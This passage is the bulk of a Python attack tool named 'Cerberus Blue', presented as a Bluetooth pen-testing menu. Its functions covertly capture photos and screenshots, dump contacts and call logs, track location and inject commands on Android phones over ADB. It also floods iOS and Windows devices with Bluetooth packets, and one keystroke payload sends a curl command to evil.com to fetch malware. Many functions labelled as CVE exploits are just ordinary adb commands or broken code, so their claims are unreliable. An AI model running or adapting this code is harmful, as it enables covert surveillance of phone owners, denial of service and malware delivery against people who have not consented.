        logging.error(f"Shell failed on {target_addr}.")

# 20. Android Camera Open (CVE-2019-2234)
def android_camera_open(target_addr):
    if not check_tool("adb", "sudo apt install android-tools-adb"):
        return
    options = {
        "1": "Basic Camera Open",
        "2": "Silent Capture (CVE-2019-2234)",
        "3": "Continuous Capture"
    }
    print_options("Android Camera Options", options)
    choice = input("[cyan] Select camera type ")
    try:
        if choice == "1":
            subprocess.run(["adb", "shell", "am", "start", "-a", "android.media.action.IMAGE_CAPTURE"], check=True, timeout=10)
            print("[green] Camera opened.")
            logging.info(f"Basic camera open on {target_addr}.")
        elif choice == "2":
            print("[cyan] Exploiting CVE-2019-2234 for silent capture...")
            with Progress() as progress:
                task = progress.add_task("[cyan]Capturing...", total=5)
                subprocess.run(["adb", "shell", "am", "start", "-n", "com.google.android.GoogleCamera/.MainActivity", "--ez", "silent_capture", "true"], stdout=subprocess.DEVNULL)
                time.sleep(5)
                subprocess.run(["adb", "shell", "screencap", "/sdcard/silent_capture.png"], check=True)
                subprocess.run(["adb", "pull", "/sdcard/silent_capture.png"], check=True)
                progress.update(task, completed=5)
            print("[green] Silent capture saved as silent_capture.png.")
            logging.info(f"CVE-2019-2234 silent capture on {target_addr}.")
        elif choice == "3":
            def capture_thread():
                for _ in range(10):
                    subprocess.run(["adb", "shell", "screencap", f"/sdcard/capture_{time.time()}.png"], stdout=subprocess.DEVNULL)
                    time.sleep(1)
            with Progress() as progress:
                task = progress.add_task("[cyan]Capturing...", total=10)
                t = threading.Thread(target=capture_thread)
                t.start()
                for _ in range(10):
                    time.sleep(1)
                    progress.update(task, advance=1)
                t.join()
                subprocess.run(["adb", "pull", "/sdcard/capture_*"], check=True)
            print("[green] Continuous captures saved.")
            logging.info(f"Continuous camera capture on {target_addr}.")
        else:
            print("[red] Invalid choice.")
            return
    except subprocess.CalledProcessError as e:
        print(f"[red] Camera open failed: {e}. Ensure USB debugging is enabled.")
        logging.error(f"Camera open failed: {e}")
    except Exception as e:
        print(f"[red] Error: {e}")
        logging.error(f"Camera open error: {e}")

# 21. Android Contact Dump (CVE-2020-0022)
def android_contact_dump(target_addr):
    if not check_tool("adb"):
        return
    options = {
        "1": "Basic Contact Dump",
        "2": "Exploit CVE-2020-0022",
        "3": "Full Sync (Contacts + Logs)"
    }
    print_options("Android Contact Options", options)
    choice = input("[cyan] Select dump type ")
    try:
        if choice == "1":
            subprocess.run(["adb", "shell", "content", "query", "--uri", "content://contacts/phones/", "> contacts.txt"], shell=True, check=True)
            subprocess.run(["adb", "pull", "/sdcard/contacts.txt"], check=True)
            print("[green] Contacts dumped to contacts.txt.")
            logging.info(f"Basic contact dump on {target_addr}.")
        elif choice == "2":
            print("[cyan] Exploiting CVE-2020-0022 for contact dump...")
            with Progress() as progress:
                task = progress.add_task("[cyan]Dumping...", total=10)
                subprocess.run(["adb", "shell", "am", "broadcast", "-a", "android.intent.action.SEND", "--es", "exploit", "content://contacts/phones/", "> exploit_contacts.txt"], shell=True, stdout=subprocess.DEVNULL)
                time.sleep(10)
                subprocess.run(["adb", "pull", "/sdcard/exploit_contacts.txt"], check=True)
                progress.update(task, completed=10)
            print("[green] Exploited contacts dumped to exploit_contacts.txt.")
            logging.info(f"CVE-2020-0022 contact dump on {target_addr}.")
        elif choice == "3":
            subprocess.run(["adb", "shell", "content", "query", "--uri", "content://contacts/phones/", "> full_contacts.txt"], shell=True, check=True)
            subprocess.run(["adb", "shell", "content", "query", "--uri", "content://call_log/calls/", "> call_logs.txt"], shell=True, check=True)
            subprocess.run(["adb", "pull", "/sdcard/full_contacts.txt"], check=True)
            subprocess.run(["adb", "pull", "/sdcard/call_logs.txt"], check=True)
            print("[green] Full sync saved as full_contacts.txt and call_logs.txt.")
            logging.info(f"Full sync on {target_addr}.")
        else:
            print("[red] Invalid choice.")
            return
    except subprocess.CalledProcessError as e:
        print(f"[red] Contact dump failed: {e}")
        logging.error(f"Contact dump failed: {e}")
    except Exception as e:
        print(f"[red] Error: {e}")
        logging.error(f"Contact dump error: {e}")

# 22. Android Location Tracking (CVE-2018-9489)
def android_location_tracking(target_addr):
    if not check_tool("adb"):
        return
    options = {
        "1": "Basic Location Dump",
        "2": "Exploit CVE-2018-9489",
        "3": "Real-Time Tracking"
    }
    print_options("Android Location Options", options)
    choice = input("[cyan] Select tracking type ")
    try:
        if choice == "1":
            subprocess.run(["adb", "shell", "dumpsys", "location", "> location.txt"], shell=True, check=True)
            subprocess.run(["adb", "pull", "/sdcard/location.txt"], check=True)
            print("[green] Location dumped to location.txt.")
            logging.info(f"Basic location dump on {target_addr}.")
        elif choice == "2":
            print("[cyan] Exploiting CVE-2018-9489 for location leak...")
            with Progress() as progress:
                task = progress.add_task("[cyan]Tracking...", total=5)
                subprocess.run(["adb", "shell", "getprop", "ro.build.version.release", "> exploit_location.txt"], shell=True, stdout=subprocess.DEVNULL)
                subprocess.run(["adb", "shell", "dumpsys", "location", ">> exploit_location.txt"], shell=True, check=True)
                time.sleep(5)
                subprocess.run(["adb", "pull", "/sdcard/exploit_location.txt"], check=True)
                progress.update(task, completed=5)
            print("[green] Exploited location saved to exploit_location.txt.")
            logging.info(f"CVE-2018-9489 location tracking on {target_addr}.")
        elif choice == "3":
            def track_thread():
                for _ in range(10):
                    subprocess.run(["adb", "shell", "dumpsys", "location", f"> /sdcard/track_{time.time()}.txt"], shell=True, stdout=subprocess.DEVNULL)
                    time.sleep(2)
            with Progress() as progress:
                task = progress.add_task("[cyan]Tracking...", total=10)
                t = threading.Thread(target=track_thread)
                t.start()
                for _ in range(10):
                    time.sleep(2)
                    progress.update(task, advance=1)
                t.join()
                subprocess.run(["adb", "pull", "/sdcard/track_*"], check=True)
            print("[green] Real-time tracking saved.")
            logging.info(f"Real-time tracking on {target_addr}.")
        else:
            print("[red] Invalid choice.")
            return
    except subprocess.CalledProcessError as e:
        print(f"[red] Location tracking failed: {e}")
        logging.error(f"Location tracking failed: {e}")
    except Exception as e:
        print(f"[red] Error: {e}")
        logging.error(f"Location tracking error: {e}")

# 23. Android Screenshot Capture (CVE-2020-0022)
def android_screenshot_capture(target_addr):
    if not check_tool("adb"):
        return
    options = {
        "1": "Basic Screenshot",
        "2": "Silent Screenshot (CVE-2020-0022)",
        "3": "Continuous Screenshots"
    }
    print_options("Android Screenshot Options", options)
    choice = input("[cyan] Select screenshot type ")
    try:
        if choice == "1":
            subprocess.run(["adb", "shell", "screencap", "/sdcard/screenshot.png"], check=True)
            subprocess.run(["adb", "pull", "/sdcard/screenshot.png"], check=True)
            print("[green] Screenshot saved as screenshot.png.")
            logging.info(f"Basic screenshot on {target_addr}.")
        elif choice == "2":
            print("[cyan] Exploiting CVE-2020-0022 for silent screenshot...")
            with Progress() as progress:
                task = progress.add_task("[cyan]Capturing...", total=5)
                subprocess.run(["adb", "shell", "am", "broadcast", "-a", "android.intent.action.SCREENSHOT", "--ez", "silent", "true", "> /sdcard/exploit_screenshot.png"], shell=True, stdout=subprocess.DEVNULL)
                time.sleep(5)
                subprocess.run(["adb", "pull", "/sdcard/exploit_screenshot.png"], check=True)
                progress.update(task, completed=5)
            print("[green] Silent screenshot saved as exploit_screenshot.png.")
            logging.info(f"CVE-2020-0022 screenshot on {target_addr}.")
        elif choice == "3":
            def capture_thread():
                for _ in range(10):
                    subprocess.run(["adb", "shell", "screencap", f"/sdcard/screen_{time.time()}.png"], stdout=subprocess.DEVNULL)
                    time.sleep(1)
            with Progress() as progress:
                task = progress.add_task("[cyan]Capturing...", total=10)
                t = threading.Thread(target=capture_thread)
                t.start()
                for _ in range(10):
                    time.sleep(1)
                    progress.update(task, advance=1)
                t.join()
                subprocess.run(["adb", "pull", "/sdcard/screen_*"], check=True)
            print("[green] Continuous screenshots saved.")
            logging.info(f"Continuous screenshots on {target_addr}.")
        else:
            print("[red] Invalid choice.")
            return
    except subprocess.CalledProcessError as e:
        print(f"[red] Screenshot failed: {e}")
        logging.error(f"Screenshot failed: {e}")
    except Exception as e:
        print(f"[red] Error: {e}")
        logging.error(f"Screenshot error: {e}")

# 24. Android Keystroke Injection (New)
def android_keystroke_injection(target_addr):
    if not check_tool("adb"):
        return
    options = {
        "1": "Basic Keystroke (Text)",
        "2": "Command Injection",
        "3": "Custom Payload"
    }
    print_options("Android Keystroke Options", options)
    choice = input("[cyan] Select injection type ")
    try:
        if choice == "1":
            text = input("[cyan] Enter text to inject: ")
            subprocess.run(["adb", "shell", "input", "text", text], check=True)
            print("[green] Keystrokes injected.")
            logging.info(f"Basic keystroke injection on {target_addr}: {text}")
        elif choice == "2":
            cmd = input("[cyan] Enter command (e.g., 'am start -a android.intent.action.CALL tel:123'): ")
            subprocess.run(["adb", "shell", cmd], check=True)
            print("[green] Command injected.")
            logging.info(f"Command injection on {target_addr}: {cmd}")
        elif choice == "3":
            payload = input("[cyan] Enter custom payload (e.g., 'input tap 500 500'): ")
            with Progress() as progress:
                task = progress.add_task("[cyan]Injecting...", total=5)
                for _ in range(5):
                    subprocess.run(["adb", "shell", payload], stdout=subprocess.DEVNULL)
                    time.sleep(1)
                    progress.update(task, advance=1)
            print("[green] Custom payload injected.")
            logging.info(f"Custom payload injection on {target_addr}: {payload}")
        else:
            print("[red] Invalid choice.")
            return
    except subprocess.CalledProcessError as e:
        print(f"[red] Injection failed: {e}. Ensure device is connected via ADB.")
        logging.error(f"Keystroke injection failed: {e}")
    except Exception as e:
        print(f"[red] Error: {e}")
        logging.error(f"Keystroke injection error: {e}")

# 25. Android App Launch (New)
def android_app_launch(target_addr):
    if not check_tool("adb"):
        return
    options = {
        "1": "Launch Browser",
        "2": "Launch Settings",
        "3": "Custom App Package"
    }
    print_options("Android App Launch Options", options)
    choice = input("[cyan] Select app to launch ")
    try:
        if choice == "1":
            subprocess.run(["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW", "-d", "http://example.com"], check=True)
            print("[green] Browser launched.")
            logging.info(f"Browser launched on {target_addr}.")
        elif choice == "2":
            subprocess.run(["adb", "shell", "am", "start", "-n", "com.android.settings/.Settings"], check=True)
            print("[green] Settings launched.")
            logging.info(f"Settings launched on {target_addr}.")
        elif choice == "3":
            package = input("[cyan] Enter package name (e.g., com.whatsapp): ")
            subprocess.run(["adb", "shell", "am", "start", "-n", f"{package}/.MainActivity"], check=True)
            print(f"[green] {package} launched.")
            logging.info(f"Custom app {package} launched on {target_addr}.")
        else:
            print("[red] Invalid choice.")
            return
    except subprocess.CalledProcessError as e:
        print(f"[red] App launch failed: {e}. Check package name or ADB connection.")
        logging.error(f"App launch failed: {e}")
    except Exception as e:
        print(f"[red] Error: {e}")
        logging.error(f"App launch error: {e}")

# 26. iOS Bluetooth Overflow (CVE-2021-31786)
def ios_bluetooth_overflow(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "Buffer Overflow",
        "2": "Heap Overflow",
        "3": "Multi-Threaded Flood"
    }
    print_options("iOS Overflow Options", options)
    choice = input("[cyan] Select attack type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Overflowing...", total=300)
            def flood_buffer():
                for _ in range(150):
                    subprocess.run(["l2ping", "-s", "2048", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            if choice == "1":
                flood_buffer()
            elif choice == "2":
                subprocess.run(["hcitool", "cmd", "0x02", "0x0004"] + ["BB"] * 1024, stdout=subprocess.DEVNULL)
                flood_buffer()
            elif choice == "3":
                threads = [threading.Thread(target=flood_buffer) for _ in range(3)]
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
            else:
                print("[red] Invalid choice.")
                return
        print("[green] iOS Bluetooth overflow executed.")
        logging.info(f"iOS overflow type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] Overflow failed: {e}")
        logging.error(f"iOS overflow failed: {e}")

# 27. Windows BleedingTooth RCE (CVE-2020-12351)
def bleedingtooth_rce(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "Basic RCE",
        "2": "Shellcode Injection",
        "3": "Persistent Attack"
    }
    print_options("Windows BleedingTooth Options", options)
    choice = input("[cyan] Select attack type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Executing...", total=200)
            shellcode = binascii.hexlify(b"\x90\x90\xCC").decode().split()
            if choice == "1":
                for _ in range(200):
                    subprocess.run(["l2ping", "-s", "1024", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            elif choice == "2":
                for _ in range(200):
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + shellcode, stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            elif choice == "3":
                def persist():
                    for _ in range(100):
                        subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + shellcode, stdout=subprocess.DEVNULL)
                        time.sleep(0.02)
                        progress.update(task, advance=1)
                threads = [threading.Thread(target=persist) for _ in range(2)]
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
            else:
                print("[red] Invalid choice.")
                return
        print("[green] BleedingTooth RCE executed.")
        logging.info(f"BleedingTooth type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] RCE failed: {e}")
        logging.error(f"BleedingTooth failed: {e}")

# 28. Cross-Platform CVE Scanner
def cve_scanner(target_addr):
    options = {str(i): f"{cve} - {data['desc']}" for i, (cve, data) in enumerate(CVE_DB.items(), 1)}
    print_options("CVE Scanner Options", options)
    choice = input("[cyan] Select CVE to test ")
    try:
        cve = list(CVE_DB.keys())[int(choice) - 1]
        exploit_func = globals().get(CVE_DB[cve]["exploit"])
        if exploit_func:
            print(f"[cyan] Testing {cve} on {target_addr}...")
            exploit_func(target_addr)
        else:
            print(f"[yellow] No exploit implemented for {cve}.")
    except (IndexError, ValueError):
        print("[red] Invalid choice.")

# 29. iOS Keystroke Injection (CVE-2023-45866)
def ios_keystroke_injection(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "Basic Keystroke",
        "2": "Command Injection",
        "3": "Payload Delivery"
    }
    print_options("iOS Keystroke Options", options)
    choice = input("[cyan] Select injection type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]Injecting...", total=50)
            if choice == "1":
                payload = binascii.hexlify(b"whoami").decode().split()
                for _ in range(50):
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + payload, stdout=subprocess.DEVNULL)
                    time.sleep(0.05)
                    progress.update(task, advance=1)
            elif choice == "2":
                payload = binascii.hexlify(b"open -a Calculator").decode().split()
                for _ in range(50):
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + payload, stdout=subprocess.DEVNULL)
                    time.sleep(0.05)
                    progress.update(task, advance=1)
            elif choice == "3":
                payload = binascii.hexlify(b"curl http://evil.com/malware").decode().split()
                for _ in range(50):
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + payload, stdout=subprocess.DEVNULL)
                    time.sleep(0.05)
                    progress.update(task, advance=1)
            else:
                print("[red] Invalid choice.")
                return
        print("[green] Keystroke injection executed.")
        logging.info(f"iOS keystroke type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] Injection failed: {e}. Requires Magic Keyboard pairing.")
        logging.error(f"iOS keystroke failed: {e}")

# 30. Windows BT DoS (CVE-2024-0230 Enhanced)
def windows_bt_dos(target_addr):
    if not check_tool("hcitool"):
        return
    options = {
        "1": "Connection Flood",
        "2": "Packet Storm",
        "3": "Multi-Threaded DoS"
    }
    print_options("Windows DoS Options", options)
    choice = input("[cyan] Select DoS type ")
    try:
        with Progress() as progress:
            task = progress.add_task("[cyan]DoSing...", total=500)
            def flood():
                for _ in range(250):
                    subprocess.run(["l2ping", "-f", "-s", "512", target_addr], stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            if choice == "1":
                flood()
            elif choice == "2":
                for _ in range(500):
                    subprocess.run(["hcitool", "cmd", "0x08", "0x0006"] + ["FF"] * 256, stdout=subprocess.DEVNULL)
                    time.sleep(0.01)
                    progress.update(task, advance=1)
            elif choice == "3":
                threads = [threading.Thread(target=flood) for _ in range(5)]
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
            else:
                print("[red] Invalid choice.")
                return
        print("[green] Windows BT DoS executed.")
        logging.info(f"Windows DoS type {choice} on {target_addr}.")
    except Exception as e:
        print(f"[red] DoS failed: {e}")
        logging.error(f"Windows DoS failed: {e}")

# Menu
def print_menu():
    menu = """
[bright_white]=== Cerberus Blue v6.1 - Best-Ever BT Pen Testing Tool ===
[cyan]General Bluetooth Attacks:
 [1] 🔍 Scan Devices
 [2] 📡 BlueBorne Overflow (CVE-2017-0785)
 [3] 🔑 Pairing Exploit (CVE-2018-5383)
 [4] 🚀 Zero-Click RCE (CVE-2020-0022)
 [5] 🔒 KNOB Key Attack (CVE-2019-9506)
 [6] 👻 BIAS Impersonation (CVE-2021-0326)
 [7] 👻 BIAS V2 Advanced (CVE-2023-45866)
 [8] 📡 BLE Spoofing (CVE-2024-21306)
 [9] 💥 Bluetooth DoS (CVE-2024-0230)
[10] 📶 Deauthentication
[11] 👁 Packet Snooping
[12] 🐛 Device Fuzzing
[13] 🕵 Reconnaissance
[14] 👻 BLE Spoofing Variants
[15] 🤝 BLE MITM (CVE-2020-15802)
[16] 😷 Device Spoofing
[17] 🔑 Encryption Crack
[18] 📡 Traffic Injection
[19] 🐚 Reverse Shell

[cyan]Android-Specific Attacks:
[20] 📷 Camera Open (CVE-2019-2234)
[21] 📖 Contact Dump (CVE-2020-0022)
[22] 🗺 Location Tracking (CVE-2018-9489)
[23] 🖼 Screenshot Capture (CVE-2020-0022)
[24] ⌨ Android Keystroke Injection [NEW]
[25] 📱 Android App Launch [NEW]

[cyan]iOS-Specific Attacks:
[26] 🍎 iOS Bluetooth Overflow (CVE-2021-31786)
[29] 🍎 iOS Keystroke Injection (CVE-2023-45866)

[cyan]Windows-Specific Attacks:
[27] 🖥 Windows BleedingTooth RCE (CVE-2020-12351)
[30] 🖥 Windows BT DoS (CVE-2024-0230 Enhanced)

[cyan]Miscellaneous:
[28] 🔎 Cross-Platform CVE Scanner

[red] [Q] 🚪 Exit
"""
    print(menu)

# Main Loop
def main():
    load_cve_db()
    try:
        print_banner()
        if not enable_bluetooth():
            print("[red] Bluetooth setup failed. Exiting...")
            return
        while True:
            print_menu()
            choice = input("[cyan] Enter your choice ")

            if choice == "1":
                devices = scan_bluetooth_devices()
                if devices:
                    target_idx = int(input("[cyan] Select a device by number ")) - 1
                    target_addr = devices[target_idx][0]
                    print(f"[green] Selected device: {target_addr}")
            elif choice in ["2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "26", "27", "29", "30"]:
                target_addr = input("[cyan] Enter target MAC address ")
                globals()[list(CVE_DB.values())[int(choice) - 2]["exploit"] if choice in ["2", "3", "4", "5", "6", "7", "8", "9", "15"] else {
                    "10": "deauthenticate_bluetooth",
                    "11": "snoop_bluetooth",
                    "12": "fuzz_bluetooth",
                    "13": "bluetooth_recon",
                    "14": "ble_spoof",
                    "16": "spoof_bluetooth_device",
                    "17": "crack_bluetooth_encryption",
                    "18": "inject_traffic",
                    "19": "bluetooth_reverse_shell",
                    "26": "ios_bluetooth_overflow",
                    "27": "bleedingtooth_rce",
                    "29": "ios_keystroke_injection",
                    "30": "windows_bt_dos"
                }[choice]](target_addr)
            elif choice in ["20", "21", "22", "23", "24", "25"]:
                target_addr = input("[cyan] Enter target MAC or leave blank for ADB ")
                globals()[{
                    "20": "android_camera_open",
                    "21": "android_contact_dump",
                    "22": "android_location_tracking",
                    "23": "android_screenshot_capture",
                    "24": "android_keystroke_injection",
                    "25": "android_app_launch"
                }[choice]](target_addr or "ADB")
            elif choice == "28":
                target_addr = input("[cyan] Enter target MAC address ")
                cve_scanner(target_addr)
            elif choice.lower() == "q":
                print("[red] Exiting...")
                break
            else:
                print("[red] Invalid option. Please try again.")
                time.sleep(1)

            if not Confirm.ask("[cyan] Continue? "):
                print("[red] Exiting...")
                break

    except KeyboardInterrupt:
        print("[red] User quit.")
        logging.info("Program terminated by user.")
    except Exception as e:
        print(f"[red] ERROR: {e}")
        logging.error(f"Program error: {e}")

if __name__ == "__main__":
    main()
